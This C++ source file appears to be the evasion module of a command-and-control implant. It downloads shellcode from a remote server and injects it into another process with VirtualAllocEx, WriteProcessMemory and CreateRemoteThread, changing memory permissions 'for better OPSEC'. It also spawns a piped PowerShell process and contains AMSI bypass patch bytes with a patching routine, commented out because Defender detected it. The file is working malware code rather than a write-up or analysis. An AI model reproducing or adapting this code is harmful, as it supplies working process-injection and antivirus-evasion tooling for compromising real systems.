#include "evasion.h"
#include "base64.h"
#include "HttpCommunicator.h"
#include "vector"
#include <windows.h>
#include <iostream>
#include <TlHelp32.h>

// TBD: This could lead to buffer overflows -> check if it is enough
#define BUFSIZE 4096

void evasion::inject_remote_thread(int pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);


    // HERE WE WILL GET THE SHELLCODE BYTES FROM SERVER
    
    std::vector<BYTE> bufVector = HttpCommunicator::download_shellcode();


    LPVOID addr = VirtualAllocExNuma(hProcess, NULL, bufVector.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);

    if (addr == NULL) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return;
    }

    
    SIZE_T outSize;
    if (!WriteProcessMemory(hProcess, addr, &bufVector[0], bufVector.size(), &outSize)) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return;
    }

    // REVERT PERMISSIONS FOR BETTER OPSEC
    DWORD oldPermissions = 0;

    
    if (!VirtualProtectEx(hProcess, addr, bufVector.size(), PAGE_EXECUTE_READ, &oldPermissions)) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return;
    }

    // OLD WAY
    
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)addr,
        (VOID*)core::instance->identifier.c_str(), // here we will mention the beacon ID
        0,
        &threadId
    );

    core::terminated = true;
}


PROCESS_INFO* evasion::create_persistent_process() {
    // we will always use PowerShell
    char cmd[] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /nologo";

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    NtProtectVirtualMemoryFunctionPointer NtProtectVirtualMemory = (NtProtectVirtualMemoryFunctionPointer)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtWriteVirtualMemoryFunctionPointer NtWriteVirtualMemory = (NtWriteVirtualMemoryFunctionPointer)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    LPSTARTUPINFOA si = new STARTUPINFOA();


    SECURITY_ATTRIBUTES saAttr;

    ZeroMemory(&saAttr, sizeof(saAttr));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE m_hChildStd_OUT_Rd = NULL;
    HANDLE m_hChildStd_OUT_Wr = NULL;

    HANDLE m_hChildStd_IN_Rd = NULL;
    HANDLE m_hChildStd_IN_Wr = NULL;


    if (!CreatePipe(&m_hChildStd_OUT_Rd, &m_hChildStd_OUT_Wr, &saAttr, 0))
    {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return NULL;
    }

    if (!CreatePipe(&m_hChildStd_IN_Rd, &m_hChildStd_IN_Wr, &saAttr, 0))
    {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return NULL;
    }

    if (!SetHandleInformation(m_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return NULL;
    }

    if (!SetHandleInformation(m_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return NULL;
    }

    HANDLE hProc = NULL;

    ZeroMemory(si, sizeof(STARTUPINFO));
    si->cb = sizeof(STARTUPINFO);
    si->hStdInput = m_hChildStd_IN_Rd;
    si->hStdError = m_hChildStd_OUT_Wr;
    si->hStdOutput = m_hChildStd_OUT_Wr;
    si->dwFlags |= STARTF_USESTDHANDLES;

    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    BOOL success = CreateProcessA(
        NULL,
        cmd, // the actual process
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        si,
        pi
    );

    if (!success) {
        std::cout << "[x] CreateProcess failed." << std::endl;
        return NULL;
    }

    Sleep(1000);

    // We need to open it using security properties (don't know why and don't care :D - IT FKNG WORKS)
    hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        pi->dwProcessId
    );

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    void* amsiAddrOpenSess = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiOpenSession");

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
    char amsiPatchOpenSess[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;

    void* amsiAddrOpenSess_bk = amsiAddr;
    // AMSI Patcher - Disabled (detected by defender)
    /*
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);

    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddrOpenSess_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddrOpenSess, (PVOID)amsiPatchOpenSess, sizeof(amsiPatchOpenSess), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddrOpenSess_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    */
    PROCESS_INFO* process_info = new PROCESS_INFO;
    process_info->pi = pi;
    process_info->stdIn = m_hChildStd_IN_Wr;
    process_info->stdOut = m_hChildStd_OUT_Rd;

    //CloseHandle(m_hChildStd_OUT_Wr);

    return process_info;
}

void evasion::send_command(const char* cmd, HANDLE amsiBypassWrPipe) {
    std::string ret;
    DWORD dwRead;
    BOOL bSuccess = FALSE;

    if (!WriteFile(amsiBypassWrPipe, cmd, strlen(cmd), &dwRead, NULL)) {
        std::cout << "[+] Error sending to pipe: " << GetLastError() << std::endl;
    }
}